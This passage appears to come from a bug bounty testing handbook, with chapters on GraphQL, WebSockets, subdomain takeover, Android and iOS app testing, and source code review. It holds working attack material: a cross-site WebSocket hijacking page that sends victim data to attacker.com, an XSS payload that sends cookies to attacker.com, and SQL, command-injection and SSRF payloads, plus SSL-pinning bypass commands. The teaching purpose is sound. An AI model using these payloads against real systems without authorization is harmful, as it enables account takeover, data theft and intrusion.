  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query":"{__schema{types{name,fields{name,args{name,type{name,kind}},type{name,kind}}}}}"}' \
  | python3 -m json.tool

# Save schema to file for analysis
curl -s -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d @introspection_query.json > schema.json
```

### Step 3: Visualize with GraphQL Voyager

1. Go to https://ivangoncharov.github.io/graphql-voyager/
2. Paste the introspection JSON result
3. See all types and relationships visually — spot `admin`, `internal`, `debug` fields

### Step 4: Test for Common Issues

```bash
# Test introspection is disabled in production
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{__schema{types{name}}}"}'

# Test field suggestions
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '{"query":"{user{admin_secret}}"}'

# Test IDOR
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer ACCOUNT_A_TOKEN" \
  -d '{"query":"{user(id:\"ACCOUNT_B_ID\"){email,privateData}}"}'

# Test batching
curl -X POST https://target.com/graphql \
  -H "Content-Type: application/json" \
  -d '[{"query":"mutation{login(email:\"u@t.com\",password:\"p1\"){token}}"},{"query":"mutation{login(email:\"u@t.com\",password:\"p2\"){token}}"}]'
```

### Step 5: Automated Scanning with graphql-cop

```bash
pip3 install graphql-cop
graphql-cop -t https://target.com/graphql -o json
```

graphql-cop checks for: introspection enabled, field suggestions enabled, batching enabled, query depth limit, field limit, and alias limit.

## Summary

GraphQL centralizes an API on one endpoint, making full enumeration possible via introspection. When introspection is disabled, field suggestions and tools like Clairvoyance reveal the schema. Authorization testing requires checking every query and mutation for IDOR. Batching attacks bypass rate limiting on sensitive operations. Always run InQL and graphql-cop as a baseline, then manually test authorization and injection in discovered operations.

## Checklist

- [ ] Identified the GraphQL endpoint (`/graphql`, `/api/graphql`, `/query`)
- [ ] Ran full introspection query — saved schema
- [ ] Identified all types, queries, mutations, and subscriptions
- [ ] If introspection blocked: tried newline bypass and `__type` alternative
- [ ] Used field suggestions to discover hidden fields (admin, internal, debug)
- [ ] Tested all queries for IDOR: substituted IDs of other users' resources
- [ ] Tested all mutations for unauthorized data modification or deletion
- [ ] Tested batching: sent array of 20+ login mutations in one request
- [ ] Tested alias-based batching as alternative
- [ ] Checked for injection in string arguments (SQL, SSRF, SSTI)
- [ ] Ran graphql-cop for automated misconfiguration checks
- [ ] Used InQL Burp extension to generate all query/mutation templates

> _"Give a developer one endpoint and they will serve you data. Forget to lock it down and you serve an attacker the whole schema."_ — Unknown

---

# Chapter 41: WebSocket Security Testing

## Objective

Understand how WebSockets work, what makes them different from HTTP for security testing, and how to test for authentication, authorization, injection, and cross-site WebSocket hijacking (CSWSH) vulnerabilities.

## Prerequisites

- Chapter 3: HTTP
- Chapter 7: Burp Suite
- Chapter 15: XSS (for injection context)

## Terminology

|Term|Definition|
|---|---|
|**WebSocket**|A protocol providing full-duplex (bidirectional) communication over a persistent TCP connection|
|**Handshake**|The HTTP upgrade request that establishes a WebSocket connection|
|**Frame**|A unit of data sent over a WebSocket connection|
|**ws://**|Unencrypted WebSocket protocol (analogous to HTTP)|
|**wss://**|Encrypted WebSocket protocol (analogous to HTTPS)|
|**Upgrade Header**|The HTTP header (`Upgrade: websocket`) that initiates the WebSocket handshake|
|**CSWSH**|Cross-Site WebSocket Hijacking — WebSocket equivalent of CSRF|
|**Origin Header**|Sent during WebSocket handshake — servers should validate this to prevent CSWSH|
|**Message**|Data exchanged over an established WebSocket connection|
|**Ping/Pong**|WebSocket control frames used to keep connections alive|

## Theory

### How WebSockets Work

Traditional HTTP is request-response: client sends a request, server responds, connection may close. WebSockets establish a persistent, bidirectional channel:

```
CLIENT                                          SERVER
│                                               │
│  GET /chat HTTP/1.1                           │
│  Upgrade: websocket                           │
│  Connection: Upgrade                          │
│  Sec-WebSocket-Key: dGhlIHNhbXBsZQ==         │
│  Origin: https://example.com                  │
│ ──────────────────────────────────────────────►│
│                                               │
│  HTTP/1.1 101 Switching Protocols             │
│  Upgrade: websocket                           │
│  Sec-WebSocket-Accept: s3pPLMBiTxaQ==        │
│ ◄──────────────────────────────────────────────│
│                                               │
│  ← WebSocket connection established →         │
│                                               │
│ → {"action":"join","room":"general"}          │
│ ◄──────────────────────────────────────────────│
│ ← {"type":"message","from":"Bob",...}         │
│ ──────────────────────────────────────────────►│
│ → {"action":"message","text":"Hello"}         │
│ ◄──────────────────────────────────────────────│
│ ← {"type":"history","messages":[...]}         │
```

Key differences for security testing:

1. Authentication happens **at the handshake** (cookies/tokens) — not per-message
2. After the handshake, messages flow freely in both directions
3. WebSocket messages often bypass WAF rules (WAFs rarely inspect WS frames)
4. The same-origin policy does not apply to WebSocket connections — but the Origin header should be checked

### Vulnerability Classes

**1. Authentication Issues**

If the WebSocket handshake does not require a valid session token, unauthenticated users can connect and receive data:

```bash
# Attempt WebSocket connection without authentication
websocat wss://target.com/ws
# If you receive data → unauthenticated access
```

**2. Authorization Issues (Privilege Escalation)**

Once connected as a regular user, can you send messages that trigger admin actions?

```json
{"action": "getAdminDashboard"}
{"action": "deleteUser", "userId": "123"}
{"action": "grantAdmin", "userId": "ATTACKER_ID"}
```

**3. Injection in Messages**

WebSocket message content is often processed server-side the same way HTTP parameters are. Test all string fields for:

- SQL Injection: `{"search": "' OR '1'='1"}`
- XSS (if reflected to other clients): `{"message": "<img src=x onerror=alert(1)>"}`
- Command Injection: `{"host": "google.com; ls"}`
- SSTI: `{"template": "{{7*7}}"}`

**4. Cross-Site WebSocket Hijacking (CSWSH)**

WebSockets are not subject to SOP. A malicious page can initiate a WebSocket connection to any server. If the server authenticates using cookies (which are automatically sent) and does not validate the `Origin` header:

```html
<!-- Malicious page at evil.com -->
<script>
  var ws = new WebSocket('wss://victim-app.com/ws');
  ws.onopen = function() {
    ws.send(JSON.stringify({"action": "getProfile"}));
  };
  ws.onmessage = function(e) {
    // Send victim's data to attacker
    fetch('https://attacker.com/collect?data=' + btoa(e.data));
  };
</script>
```

If `victim-app.com/ws` connects the user (using their session cookie) without checking that the Origin is `victim-app.com`, the victim's data flows to the attacker.

**5. Unencrypted WebSockets (ws://)**

Using `ws://` instead of `wss://` exposes all messages to network interception. Flag any production application using `ws://`.

## Practical / Lab Section

### Step 1: Intercepting WebSocket Traffic in Burp

Burp automatically intercepts WebSocket handshakes and messages:

1. Browse to a WebSocket-enabled feature (chat, live notifications, real-time feeds)
2. In Burp → **Proxy → WebSockets history** — shows all WS messages
3. Right-click any message → Send to Repeater
4. In Repeater: modify and replay individual messages

### Step 2: Test Authentication at Handshake

```bash
# Install websocat (WebSocket command-line client)
# Linux: cargo install websocat

# Connect without session cookie
websocat wss://target.com/ws
# If connection succeeds and returns data → no authentication on WS

# Connect with different user's cookie
websocat -H "Cookie: session=OTHER_USER_SESSION" wss://target.com/ws
```

### Step 3: Test Authorization in Messages

Send modified messages with elevated actions in Burp Repeater:

```json
// Original message (captured from legitimate use)
{"action": "getMessages", "roomId": "general"}

// Test: access other room
{"action": "getMessages", "roomId": "admin-only"}

// Test: admin action
{"action": "kickUser", "userId": "123"}

// Test: access other user's data
{"action": "getProfile", "userId": "OTHER_USER_ID"}
```

### Step 4: Test for Injection

```json
// SQL injection
{"search": "' OR 1=1 --"}
{"userId": "1 UNION SELECT username, password FROM users--"}

// XSS (stored, reflected to other clients)
{"message": "<svg onload=alert(document.cookie)>"}
{"username": "'\"><img src=x onerror=fetch('https://attacker.com/?c='+document.cookie)>"}

// SSRF via URL field
{"url": "http://169.254.169.254/latest/meta-data/"}
```

### Step 5: Test CSWSH

Create a proof of concept:

```html
<!DOCTYPE html>
<html>
<body>
  <div id="output"></div>
  <script>
    var ws = new WebSocket('wss://target.com/ws');
    var out = document.getElementById('output');

    ws.onopen = function() {
      out.innerHTML += '<p>Connected! Sending data request...</p>';
      ws.send(JSON.stringify({"action": "getProfile"}));
    };
    ws.onmessage = function(e) {
      out.innerHTML += '<p>Received: ' + e.data + '</p>';
      // In a real attack: exfiltrate this data
      // fetch('https://attacker.com/collect?d=' + btoa(e.data));
    };
    ws.onerror = function(e) {
      out.innerHTML += '<p>Error (likely Origin check working)</p>';
    };
  </script>
</body>
</html>
```

Open this file in a browser (from `file://` or another origin). If the connection succeeds and returns the victim's profile data, CSWSH is confirmed.

### Step 6: Check Origin Validation

In Burp, intercept the WebSocket handshake request and modify the `Origin` header:

```
Original: Origin: https://target.com
Test 1:   Remove Origin header entirely
Test 2:   Origin: https://evil.com
Test 3:   Origin: null
```

If the server accepts connections with any Origin, it is vulnerable to CSWSH (assuming cookies are used for authentication).

## Summary

WebSockets require testing both the initial HTTP handshake and the ongoing message stream. The critical checks are: authentication enforcement at the handshake, authorization controls on each message action, injection in all string fields, and CSWSH via Origin header validation. Burp Suite automatically captures WebSocket messages in WebSockets history. CSWSH is particularly impactful because it allows a malicious page to silently steal data or perform actions on behalf of authenticated users.

## Checklist

- [ ] Located WebSocket endpoints in the application (Burp WebSockets history, JS source)
- [ ] Confirmed whether connection uses `wss://` (encrypted) or `ws://` (plaintext)
- [ ] Tested connection without authentication token — does the server allow it?
- [ ] Tested connection with another user's session — does data isolation hold?
- [ ] Reviewed all message types/actions in WebSocket history
- [ ] Modified each action field to attempt unauthorized operations
- [ ] Tested all string fields for SQL injection, XSS, SSTI, SSRF
- [ ] Captured the WebSocket handshake and tested Origin header manipulation
- [ ] Built a CSWSH PoC page and tested from a different origin
- [ ] Checked whether the application uses cookies (automatically sent, enabling CSWSH) or token headers (not automatically sent, CSWSH protected) for WS auth
- [ ] Used Burp Repeater to replay and modify individual WebSocket messages

> _"WebSockets are HTTP's quieter sibling — fewer eyes watching, more mischief possible."_ — Bug Bounty Community

---

# Chapter 42: Subdomain Takeover (Deep Dive)

## Objective

Go beyond basic subdomain discovery to fully understand the mechanics of subdomain takeover, how to identify vulnerable subdomains at scale, how to safely verify without actually taking over, and how to write a compelling report.

## Prerequisites

- Chapter 13: Subdomain Enumeration
- Chapter 11: Passive Reconnaissance
- Chapter 32: Automation Pipelines

## Terminology

|Term|Definition|
|---|---|
|**Subdomain Takeover**|Claiming control of a subdomain that points to an external service the target no longer uses|
|**Dangling DNS**|A DNS record pointing to a resource that no longer exists|
|**CNAME**|A DNS record type that maps one domain name to another|
|**CNAME Chain**|A series of CNAME records pointing from one domain to another|
|**Fingerprint**|The error page content that identifies a specific cloud service as unclaimed|
|**AWS S3**|Amazon's cloud storage service — a common takeover target|
|**Azure**|Microsoft's cloud platform — subdomains, App Services, and CDN endpoints commonly vulnerable|
|**GitHub Pages**|Static site hosting — subdomain takeover via unclaimed GitHub Pages|
|**Fastly / Heroku / Netlify**|CDN/hosting providers where unclaimed subdomains are vulnerable|
|**can-i-take-over-xyz**|A GitHub repository cataloguing vulnerable services and their fingerprints|

## Theory

### The Mechanism

When a company uses a cloud service, they create a DNS record pointing their subdomain to that service:

```
CNAME Record: blog.company.com → company.github.io
Or A Record via CNAME chain: cdn.company.com → d1234.cloudfront.net → AWS IP
```

If the company stops using that cloud service but **forgets to remove the DNS record**, the subdomain now points to an unclaimed slot on the cloud provider. Anyone who claims that slot effectively controls `blog.company.com` — serving any content under the company's domain.

```
Normal:
  blog.company.com → company.github.io → Company's actual content

After company deletes GitHub Pages repo but keeps DNS:
  blog.company.com → company.github.io → "There isn't a GitHub Pages site here"

After attacker creates github.com/company (if username available):
  blog.company.com → company.github.io → ATTACKER'S CONTENT under company.com
```

### Why This Matters

A subdomain takeover allows an attacker to:

1. **Serve phishing pages** under a trusted domain (`login.bank.com` controlled by attacker)
2. **Steal cookies** — if the cookies use `Domain: company.com`, they are sent to any `*.company.com` subdomain
3. **Bypass CSP** — the attacker's domain is in the trusted allowlist as a company subdomain
4. **Send authenticated requests** — from a trusted domain, the SOP allows more
5. **Compromise SPF/DMARC** — send email appearing to come from `company.com`
6. **Damage trust** — serve malware under a company's trusted brand

### Services Commonly Vulnerable

|Service|Fingerprint (error page contains)|How to Claim|
|---|---|---|
|GitHub Pages|"There isn't a GitHub Pages site here"|Create the GitHub repo|
|Heroku|"No such app"|Create Heroku app with same name|
|AWS S3|"NoSuchBucket"|Create S3 bucket with same name|
|Fastly|"Fastly error: unknown domain"|Add domain in new Fastly account|
|Azure App Service|"Error 404 - Web app not found"|Create Azure app with same subdomain|
|Netlify|"Not found" with Netlify branding|Create Netlify site with same name|
|Shopify|"Sorry, this shop is currently unavailable"|Create a Shopify store|
|Zendesk|"Help Center Closed"|Create Zendesk account|
|Tumblr|"There's nothing here"|Create Tumblr blog|

Full updated list: https://github.com/EdOverflow/can-i-take-over-xyz

### The Safe Verification Line

**You must NOT actually take over the subdomain to confirm the vulnerability in bug bounty.** Simply documenting:

1. The dangling DNS record
2. The cloud service it points to
3. The fingerprint error page confirming the resource is unclaimed

...is sufficient to report. Actually claiming the subdomain is aggressive, creates legal complexity, and many programs explicitly forbid it.

For high-value findings where you want stronger proof and the program policy permits, a conservative approach is to claim the resource and immediately serve only a simple text file confirming your identity and the date — then report and wait for remediation before removing your claim.

## Practical / Lab Section

### Step 1: Enumerate Subdomains at Scale

```bash
TARGET="target.com"
OUTPUT="recon/$TARGET"
mkdir -p $OUTPUT

# Combine multiple sources
subfinder -d $TARGET -all -silent > $OUTPUT/subs_subfinder.txt
amass enum -passive -d $TARGET -o $OUTPUT/subs_amass.txt
curl -s "https://crt.sh/?q=%25.$TARGET&output=json" | \
  jq -r '.[].name_value' | sed 's/\*\.//g' | sort -u > $OUTPUT/subs_crtsh.txt

# Combine all
cat $OUTPUT/subs_*.txt | sort -u > $OUTPUT/all_subdomains.txt
echo "[+] Total unique subdomains: $(wc -l < $OUTPUT/all_subdomains.txt)"
```

### Step 2: Resolve DNS and Check CNAME Records

```bash
# Resolve all subdomains — find which ones respond
cat $OUTPUT/all_subdomains.txt | massdns -r resolvers.txt -t A -o S -w $OUTPUT/resolved.txt

# Extract CNAME records specifically
cat $OUTPUT/all_subdomains.txt | dnsx -silent -cname -o $OUTPUT/cnames.txt

# Show only CNAME records pointing to cloud providers
grep -E "github.io|herokuapp.com|s3.amazonaws.com|azurewebsites.net|cloudfront.net|netlify.app|ghost.io|fastly.net" \
  $OUTPUT/cnames.txt
```

### Step 3: Identify Non-Resolving CNAMEs

```bash
# Find subdomains with CNAME records but no A record (dangling)
cat $OUTPUT/all_subdomains.txt | dnsx -silent -a -resp-only -o /tmp/has_a.txt
comm -23 <(cat $OUTPUT/all_subdomains.txt | sort) <(sort /tmp/has_a.txt) > $OUTPUT/no_a_record.txt

# These might have CNAME records pointing to nothing
cat $OUTPUT/no_a_record.txt | dnsx -silent -cname -resp-only
```

### Step 4: Probe for Fingerprints with subjack and nuclei

```bash
# Using subjack
go install github.com/haccer/subjack@latest
subjack -w $OUTPUT/all_subdomains.txt -t 100 -timeout 30 \
  -ssl -c $(go env GOPATH)/pkg/mod/github.com/haccer/subjack*/fingerprints.json \
  -v -o $OUTPUT/takeover_candidates.txt

# Using nuclei with subdomain takeover templates
nuclei -l $OUTPUT/all_subdomains.txt \
  -t ~/nuclei-templates/takeovers/ \
  -o $OUTPUT/nuclei_takeovers.txt

# Using tko-subs
go install github.com/anshumanbh/tko-subs@latest
tko-subs -domains $OUTPUT/all_subdomains.txt \
  -data providers-data.csv \
  -output $OUTPUT/tko_results.csv
```

### Step 5: Manual Fingerprint Verification

For any candidate found by automated tools, manually verify:

```bash
# Check the HTTP response body for fingerprints
curl -s https://subdomain.target.com | grep -i "not found\|no such\|doesn't exist\|unclaim\|nothing here"

# Check CNAME destination
dig CNAME subdomain.target.com

# Check if the cloud resource is claimed
# For S3: try to access the bucket directly
curl -s https://s3.amazonaws.com/BUCKET-NAME/

# For GitHub Pages: check if the repo exists
curl -s https://github.com/ORGNAME
```

### Step 6: What to Include in the Report

A strong subdomain takeover report includes:

1. **The vulnerable subdomain**: `blog.target.com`
2. **The DNS record**: `blog.target.com CNAME target.github.io`
3. **Proof the resource is unclaimed**: screenshot of the fingerprint error page
4. **The service**: GitHub Pages
5. **How to reproduce**: `dig CNAME blog.target.com` showing the dangling CNAME
6. **Impact**: phishing, cookie theft, CSP bypass — be specific
7. **Evidence**: DNS lookup output + HTTP response body

### Step 7: Hardest-to-Find Cases — CNAME Chains

```bash
# Some takeovers are in the middle of CNAME chains:
# target.com → cdn.target.com → partner-cdn.fastly.net → (unclaimed)

# Trace full CNAME chains
dig +trace CNAME subdomain.target.com

# Follow chains manually
dig CNAME subdomain.target.com     # → something.external.com
dig CNAME something.external.com   # → another.service.net
# Continue until you hit an A record or find a dangling end
```

## Summary

Subdomain takeover requires finding CNAMEs that point to unclaimed cloud resources. The pipeline is: enumerate → resolve → identify dangling CNAMEs → fingerprint → verify → report. Tools include subjack, tko-subs, and nuclei's takeover templates. **Never actually claim the subdomain** without explicit program permission. Impact ranges from Medium to High depending on cookie scope, CSP implications, and phishing potential. This is one of the most automatable vulnerability classes — a strong automation pipeline can find these before competitors.

## Checklist

- [ ] Collected subdomains from all passive sources (subfinder, amass, crt.sh, chaos, securitytrails)
- [ ] Resolved all subdomains with massdns or dnsx — identified live vs dead
- [ ] Extracted all CNAME records — identified external CNAME targets (cloud services)
- [ ] Identified dangling CNAMEs (CNAME exists, no valid A record)
- [ ] Ran subjack and nuclei takeover templates against the subdomain list
- [ ] Manually verified fingerprint error pages for each candidate
- [ ] Cross-referenced with can-i-take-over-xyz for confirmation and claim instructions
- [ ] Traced full CNAME chains to identify chain-based takeovers
- [ ] Did NOT claim the subdomain without explicit program permission
- [ ] Report includes: subdomain, DNS record, fingerprint screenshot, service, impact

> _"The most dangerous subdomains are the ones everyone forgot about."_ — Bug Bounty Wisdom

---

# PART SEVEN: MOBILE & CODE

---

# Chapter 43: Mobile App Security Testing (Android & iOS)

## Objective

Learn the foundational methodology for testing Android and iOS mobile applications in bug bounty programs, including how to set up a testing environment, intercept mobile traffic, and test for the most common mobile-specific vulnerabilities.

## Prerequisites

- Chapter 7: Burp Suite
- Chapter 3: HTTP
- Chapter 6: Lab Environment
- A physical Android device or emulator (for Android testing)

## Terminology

|Term|Definition|
|---|---|
|**APK**|Android Package — the file format for Android applications|
|**IPA**|iOS App Archive — the file format for iOS applications|
|**ADB**|Android Debug Bridge — a command-line tool for communicating with Android devices|
|**Frida**|A dynamic instrumentation toolkit for hooking into app functions at runtime|
|**jadx**|A decompiler that converts APK bytecode back to readable Java/Kotlin source|
|**MobSF**|Mobile Security Framework — an automated static and dynamic analysis tool|
|**SSL Pinning**|A security measure where an app rejects certificates from any CA except its own|
|**Rooting (Android)**|Gaining privileged (root) access to an Android device|
|**Jailbreaking (iOS)**|Gaining privileged access to an iOS device|
|**OWASP Mobile Top 10**|A list of the most critical mobile app security risks|
|**Deeplink**|A URL scheme (`myapp://`) that opens a specific screen within the app|
|**Exported Activity**|An Android activity accessible to other apps without authentication|
|**Content Provider**|An Android component that manages shared app data, potentially accessible to other apps|

## Theory

### Why Mobile Apps Are a Bug Bounty Goldmine

Mobile apps present a different attack surface than web apps:

1. **The binary is public** — anyone can download the APK/IPA and reverse-engineer it
2. **Hardcoded secrets** — API keys, staging URLs, admin credentials embedded in the binary
3. **Insecure data storage** — sensitive data stored in shared preferences, unencrypted SQLite, or external storage
4. **Broken SSL pinning** — when bypassed, reveals all API traffic that the web app may not expose
5. **Export vulnerabilities** — Android components exported without proper permissions
6. **Same backend, different trust** — mobile apps often call the same backend APIs as the web app, but with different (sometimes weaker) authorization logic

### The Android Testing Environment

**Option A: Physical Android Device + ADB**

A real Android device provides the most realistic environment. For full testing (traffic interception, app inspection), rooting is helpful but not always required.

```bash
# Check if device is connected
adb devices

# Install an APK
adb install target_app.apk

# Pull an APK from device (for apps already installed)
adb shell pm list packages | grep target
adb shell pm path com.target.app
adb pull /data/app/com.target.app-1/base.apk

# View real-time logs (logcat)
adb logcat | grep -i "target\|error\|api\|token\|password\|secret"
```

**Option B: Emulator (Android Studio AVD)**

```bash
# Create AVD (Android Virtual Device) in Android Studio
# Choose a device without Play Store for root access

# Start emulator
emulator -avd Pixel_4_API_30

# Emulators are easier to root and certificate-install
```

### Setting Up Traffic Interception (Burp + Android)

**Step 1: Export Burp's CA Certificate**

1. Burp Suite → Proxy → Options → Import / export CA certificate
2. Export as DER format → save as `burp.cer`

**Step 2: Install on Android (System-Level — Requires Root)**

```bash
# Convert DER to PEM
openssl x509 -inform DER -in burp.cer -out burp.pem

# Get the hash for the filename
HASH=$(openssl x509 -inform PEM -subject_hash_old -in burp.pem | head -1)

# Copy to system trust store (root required)
adb root
adb remount
adb push burp.pem /system/etc/security/cacerts/$HASH.0
adb shell chmod 644 /system/etc/security/cacerts/$HASH.0
adb reboot
```

**Step 3: Set Burp as Proxy**

On the Android device: WiFi → Long press your network → Modify → Set proxy to Burp machine IP, port 8080.

### Bypassing SSL Pinning

Many production apps use SSL pinning — they reject Burp's certificate even after installing it system-wide. Bypass methods:

**Method 1: Frida (Runtime Hooking)**

```bash
# Install Frida server on Android device
wget https://github.com/frida/frida/releases/latest/download/frida-server-android-arm64.xz
xz -d frida-server-android-arm64.xz
adb push frida-server-android-arm64 /data/local/tmp/frida-server
adb shell chmod 755 /data/local/tmp/frida-server
adb shell /data/local/tmp/frida-server &

# Install Frida on your machine
pip install frida-tools

# Apply SSL pinning bypass script
frida -U -f com.target.app \
  -l https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/

# Or use the universal bypass
frida --codeshare akabe1/frida-multiple-unpinning -f com.target.app -U
```

**Method 2: Objection (Frida Wrapper)**

```bash
pip install objection

# Start objection
objection -g com.target.app explore

# Disable SSL pinning
android sslpinning disable

# Now all traffic flows through Burp
```

**Method 3: APK Patching (No Root Required)**

```bash
# Use apk-mitm to patch the APK directly
npm install -g apk-mitm
apk-mitm original_app.apk

# Install the patched APK
adb install patched_app.apk
```

### Static Analysis (APK Reverse Engineering)

```bash
# Decompile APK with jadx
jadx -d output_dir/ target_app.apk

# Search for secrets
grep -r "api_key\|apikey\|secret\|password\|token\|aws\|s3\|firebase" output_dir/

# Search for URLs (backend endpoints)
grep -r "https://\|http://" output_dir/ | grep -v ".xml\|.png\|.jpg"

# Search for hardcoded credentials
grep -r "username\|password\|admin\|passw" output_dir/sources/ --include="*.java"
```

### Using MobSF for Automated Analysis

```bash
# Run MobSF via Docker
docker pull opensecurity/mobile-security-framework-mobsf
docker run -it -p 8000:8000 opensecurity/mobile-security-framework-mobsf:latest

# Upload APK via browser at http://localhost:8000
# MobSF produces:
# - Static analysis (permissions, exported components, hardcoded secrets)
# - Certificate analysis
# - Code analysis (vulnerable patterns)
# - API call mapping
```

### Android-Specific Vulnerabilities

**Exported Components:**

```bash
# Find exported activities in AndroidManifest.xml
jadx -d output/ app.apk
grep -A2 "exported=\"true\"" output/resources/AndroidManifest.xml

# Launch exported activity (may bypass authentication)
adb shell am start -n com.target.app/.activities.AdminActivity

# Test exported content providers
adb shell content query --uri content://com.target.app.provider/users
```

**Insecure Data Storage:**

```bash
# Check SharedPreferences (unencrypted key-value store)
adb shell run-as com.target.app cat /data/data/com.target.app/shared_prefs/prefs.xml

# Check SQLite databases
adb shell run-as com.target.app ls /data/data/com.target.app/databases/
adb shell run-as com.target.app sqlite3 /data/data/com.target.app/databases/app.db .tables
adb shell run-as com.target.app sqlite3 /data/data/com.target.app/databases/app.db \
  "SELECT * FROM users LIMIT 10"

# Check external storage
adb shell ls /sdcard/Android/data/com.target.app/
```

**Deeplink Vulnerabilities:**

```bash
# Find deeplink schemes in the manifest
grep -i "scheme\|host\|pathPrefix" output/resources/AndroidManifest.xml

# Test a deeplink
adb shell am start -W -a android.intent.action.VIEW \
  -d "myapp://admin/dashboard" com.target.app

# Test with injected data
adb shell am start -W -a android.intent.action.VIEW \
  -d "myapp://redirect?url=https://evil.com" com.target.app
```

### iOS Testing Basics

iOS testing is harder — it requires a jailbroken device or specific paid tools. Key approaches:

```bash
# Decrypt IPA (on jailbroken device with frida-ios-dump or bagbak)
pip install bagbak
bagbak com.target.app -o decrypted.ipa

# Unzip and examine
unzip decrypted.ipa -d ipa_contents
cd ipa_contents/Payload/TargetApp.app

# Check binary for hardcoded strings
strings TargetApp | grep -i "api\|key\|secret\|token\|password\|http"

# Check plist files
plutil -p Info.plist
cat *.plist

# SSL pinning bypass (iOS)
frida -U -f com.target.app --no-pause \
  -l https://codeshare.frida.re/@machorka/ssl-kill-switch-3/
```

### OWASP Mobile Top 10 Quick Reference

|#|Risk|Quick Test|
|---|---|---|
|M1|Improper Credential Usage|Grep binary for secrets; check logcat|
|M2|Inadequate Supply Chain Security|Check dependencies for known CVEs|
|M3|Insecure Authentication|Test API with no/invalid tokens|
|M4|Insufficient Input/Output Validation|Test all API params for injection|
|M5|Insecure Communication|`ws://` usage; SSLStrip; certificate issues|
|M6|Inadequate Privacy Controls|Check insecure data storage|
|M7|Insufficient Binary Protections|Run MobSF static analysis|
|M8|Security Misconfiguration|Check exported components, Firebase rules|
|M9|Insecure Data Storage|SharedPreferences, SQLite, external storage|
|M10|Insufficient Cryptography|Hardcoded keys, weak algorithms|

## Summary

Mobile security testing combines static analysis (decompiling the APK), dynamic analysis (intercepting traffic via Burp + SSL pinning bypass), and runtime inspection (Frida for hooking functions). Start with MobSF for automated static analysis, then set up traffic interception with Frida/Objection's SSL pinning bypass, then test the app's backend API endpoints using the same methodology as web testing. Check Android-specific issues: exported components, insecure data storage, and deeplink handlers.

## Checklist

- [ ] Downloaded the APK (from Google Play using APKPure/APKCombo, or `adb pull`)
- [ ] Ran MobSF static analysis — reviewed hardcoded secrets, permissions, exported components
- [ ] Decompiled with jadx — searched source for API keys, credentials, URLs, secrets
- [ ] Searched AndroidManifest.xml for exported activities/providers/receivers
- [ ] Launched exported activities via adb and noted any authentication bypass
- [ ] Set up Burp as proxy and configured Android to use it
- [ ] If SSL pinning detected: used Objection or Frida to bypass it
- [ ] All API calls now visible in Burp — tested with standard web vulnerability methodology
- [ ] Checked insecure data storage: SharedPreferences, SQLite, external storage
- [ ] Monitored logcat for sensitive data leaking to logs
- [ ] Tested all deeplinks for open redirect, XSS, or unauthorized access

> _"The app is the key. The API is the kingdom."_ — Mobile Security Community

---

# Chapter 44: Source Code Review for Bug Bounty

## Objective

Learn how to efficiently review source code for security vulnerabilities in bug bounty programs that provide source access, and how to apply code review techniques to JavaScript and leaked/disclosed code even when full source isn't provided.

## Prerequisites

- Chapter 5: Linux
- Chapter 31: JavaScript Analysis
- Familiarity with at least one programming language

## Terminology

|Term|Definition|
|---|---|
|**Static Analysis**|Analyzing code without executing it — reading for vulnerability patterns|
|**Dynamic Analysis**|Analyzing code behavior while it runs|
|**SAST**|Static Application Security Testing — automated static code analysis tools|
|**Taint Analysis**|Tracking the flow of user-controlled input (taint source) to dangerous functions (sinks)|
|**Source**|A point where untrusted user input enters the application|
|**Sink**|A dangerous function that could cause harm if passed untrusted data|
|**Grep**|A command-line tool for searching text patterns — the bug hunter's best friend|
|**Semgrep**|A fast, open-source static analysis tool with security-focused rules|
|**CodeQL**|GitHub's semantic code analysis engine|
|**Sanitization**|Code that cleans or escapes user input before it reaches a sink|
|**Dangerously Insecure Function**|A function known to be dangerous when called with untrusted input|

## Theory

### The Source-to-Sink Model

Every vulnerability can be modeled as user-controlled data flowing from a **source** to a **sink** without adequate **sanitization**:

```
SOURCE (user input)      SANITIZATION         SINK (dangerous function)
│                        │                    │
User sends ?name=John    name.strip()         db.query("SELECT * FROM
User sends ?id=1         int(id)              users WHERE name="+name)
User uploads file.jpg    validate_type()      os.system("convert "+file)
User sets cookie value   jwt.verify()         eval(cookie)
│                        │                    │
└────────────────────────┴────────────────────┘
If user-controlled data reaches the sink without appropriate
sanitization for that sink type → vulnerability exists
```

### The Two Approaches: Backward and Forward

**Backward (sink-first):** Start with dangerous functions. Find them in the codebase. Trace backward to see if user input can reach them.

```bash
# Sink-first search
grep -r "eval\|exec\|system\|popen\|subprocess\|os.popen" --include="*.py" .
grep -r "innerHTML\|document.write\|dangerouslySetInnerHTML" --include="*.js" .
grep -r "query\|execute\|raw\|cursor.execute" --include="*.py" . | grep "\+"
```

**Forward (source-first):** Start with input entry points. Trace forward to see where user data goes.

```bash
# Source-first search — find where user input enters
grep -r "request\.\|req\.body\|req\.query\|req\.params\|\$_GET\|\$_POST\|\$_REQUEST" \
  --include="*.php" --include="*.js" . | head -50
```

### High-Value Sinks by Language

**Python:**

|Sink|Vulnerability|
|---|---|
|`eval()`, `exec()`|Remote Code Execution|
|`os.system()`, `subprocess.call()`|Command Injection|
|`open()` with user-controlled path|Path Traversal|
|`pickle.loads()`|Insecure Deserialization|
|`yaml.load()` (not `safe_load`)|YAML Deserialization|
|`render_template_string()`|SSTI|
|`cursor.execute("..." + input)`|SQL Injection|
|`redirect(user_input)`|Open Redirect|

**JavaScript/Node.js:**

|Sink|Vulnerability|
|---|---|
|`eval()`, `Function()`|RCE / XSS|
|`innerHTML`, `outerHTML`|XSS|
|`document.write()`|XSS|
|`child_process.exec()`|Command Injection|
|`res.redirect(user_input)`|Open Redirect|
|`path.join()` with user input|Path Traversal|
|`require(user_input)`|RCE|
|`JSON.parse()` without validation|Type confusion, prototype pollution|

**PHP:**

|Sink|Vulnerability|
|---|---|
|`eval()`|RCE|
|`system()`, `exec()`, `shell_exec()`, backtick|Command Injection|
|`include()`, `require()`|Local/Remote File Inclusion|
|`file_get_contents()`, `fopen()`|SSRF, Path Traversal|
|`mysqli_query()` with concatenation|SQL Injection|
|`unserialize()`|Insecure Deserialization|
|`header("Location: " . $input)`|Open Redirect|
|`preg_replace()` with `/e` flag|RCE (old PHP)|

### Using Semgrep for Automated Pattern Matching

```bash
